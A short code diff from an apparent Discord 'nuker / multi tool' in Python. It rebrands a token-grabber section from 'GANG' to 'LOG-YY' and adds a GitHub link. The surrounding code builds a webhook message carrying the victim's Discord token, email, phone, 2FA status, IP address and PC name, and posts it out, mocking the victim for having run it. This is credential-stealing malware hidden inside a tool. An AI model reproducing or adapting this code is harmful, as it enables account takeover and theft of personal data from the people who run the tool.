@@ -1,4 +1,4 @@
-# Developper : waltta#6821 | 
+# Developper : waltta#6821 | https://github.com/waltta/LOG-YY-Nuker-Discord
 # LOG-YY Discord Nuker / Multi Tool©
 # Copyright © 2022 waltta#6821 
 # Copyright © LOG-YY-Nuke
@@ -153,8 +153,8 @@ def get_token():
 > :gear: __Account Information:__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information:__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
 > :warning: __Token:__\n\t`{tok}`\n
-`{pc_username} Has Ran GANG-Nuker Token Grabber!` :smiling_imp:\"""
-                        payload = json.dumps({'content': embed, 'username': 'GANG GRABBER', 'avatar_url': 'https://media.discordapp.net/attachments/878154522978029582/917679300705124412/a4235fd1da45633adbc305450741b506.png'})
+`{pc_username} Has Ran LOGYY-Nuker Token Grabber!` :smiling_imp:\"""
+                        payload = json.dumps({'content': embed, 'username': 'LOGYY ManGrabber', 'avatar_url': 'https://media.discordapp.net/attachments/987095218920755232/1003976624175337492/LOG-YY-Nuker_ICON.png?width=646&height=646'})
                         try:
                             headers2 = {
                                 'Content-Type': 'application/json',
